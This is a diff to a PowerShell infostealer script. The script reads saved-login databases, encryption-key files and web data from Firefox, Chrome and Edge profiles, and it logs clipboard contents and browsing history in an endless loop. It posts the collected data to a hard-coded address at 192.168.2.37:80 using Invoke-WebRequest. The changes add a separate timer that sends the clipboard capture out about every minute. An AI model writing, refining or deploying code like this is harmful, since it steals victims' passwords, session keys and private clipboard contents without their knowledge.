@@ -12,7 +12,7 @@ $URI = "192.168.2.37:80"
 
 if (Test-Path -Path FireFox) { 
     if (Test-Path -Path "FireFox/User Data/Default/Login Data") {
-        $var += cat -Path "Firefox/User Data/Default/Login Data"; $var += cat -Path "Firefox/User Data/Local State";$var += cat -Path "Firefox/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch;
+        $var += cat -Path "Firefox/User Data/Default/Login Data";$var = "FIREFOX KEY"; $var += cat -Path "Firefox/User Data/Local State";$var += cat -Path "Firefox/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch;
     }else{
         $Firenormal = Write-Output "false"
     }
@@ -93,7 +93,7 @@ if (Test-Path -Path FireFox) {
 if (Test-Path -Path Google) {
     if (Test-Path -Path "Google/Chrome/User Data/Default/login Data") {
         $Chromenormal = Write-Output "true"
-        $var += cat -Path "Google/Chrome/User Data/Default/Login Data";$var += cat -Path "Google/Chrome/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch;$var += cat -Path "Google/Chrome/User Data/Local State"
+        $var += cat -Path "Google/Chrome/User Data/Default/Login Data";$var += cat -Path "Google/Chrome/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch;$var = "CHROME KEY";$var += cat -Path "Google/Chrome/User Data/Local State"
     }else{
         $Chromenormal = Write-Output "false"
     }
@@ -173,7 +173,7 @@ if (Test-Path -Path Google) {
 
 if (Test-Path -Path Microsoft) {
     if (Test-Path -Path "Microsoft/Edge/User Data/Default/Login Data") {
-        $var += cat -Path "Microsoft/Edge/User Data/Default/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Local State"; $var += cat -Path "Microsoft/Edge/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch
+        $var += cat -Path "Microsoft/Edge/User Data/Default/Login Data";$var = "EDGE KEY"; $var += cat -Path "Microsoft/Edge/User Data/Local State"; $var += cat -Path "Microsoft/Edge/User Data/Default/Web Data" | Select-String -Pattern 'https' -SimpleMatch
         $EdgeNormal = Write-Output "True"
     }else{
         $EdgeNormal = Write-Output "false"
@@ -281,9 +281,14 @@ Clear-History
 $stopwatch = [System.Diagnostics.Stopwatch]::new()
 $Stopwatch.Start()
 
+$stopwatch2 = [System.Diagnostics.Stopwatch]::new()
+$Stopwatch2.Start()
+
 while($true)
-{ 
-    $varper += Get-Clipboard
+{   
+    $clip += "CLIPBOARD ~~~~~~~~~"
+
+    $clip += Get-Clipboard
 
     if($Firenormal -eq $True) {
         $varper += cat -Path "Firefox/User Data/Default/History"
@@ -509,16 +514,21 @@ while($true)
 
     $varper += Get-Date
 
-    $varper | Out-File fff.txt -Append
-
-    if($Stopwatch.Elapsed.Hours -eq 24) {
-        $varper = cat fff.txt 
+    if($Stopwatch.Elapsed.Hours -eq 24) { 
         $Response = Invoke-WebRequest -Method Post -URI $URI -body $varper -UseBasicParsing -Timeout 5
         start-sleep 4
-        $Response = Invoke-WebRequest -Method Post -URI $URI -body $clip -UseBasicParsing -Timeout 5
         $Stopwatch.Stop()
         $stopwatch = [System.Diagnostics.Stopwatch]::new()
         $Stopwatch.Start()
+    } else {
+    }
+
+    if($Stopwatch2.Elapsed.Seconds -eq 60) {
+        $Response = Invoke-WebRequest -Method Post -URI $URI -body $clip -UseBasicParsing -Timeout 5
+        start-sleep 4
+        $Stopwatch2.Stop()
+        $stopwatch2 = [System.Diagnostics.Stopwatch]::new()
+        $Stopwatch2.Start()
     } else {
     }
     start-sleep 60
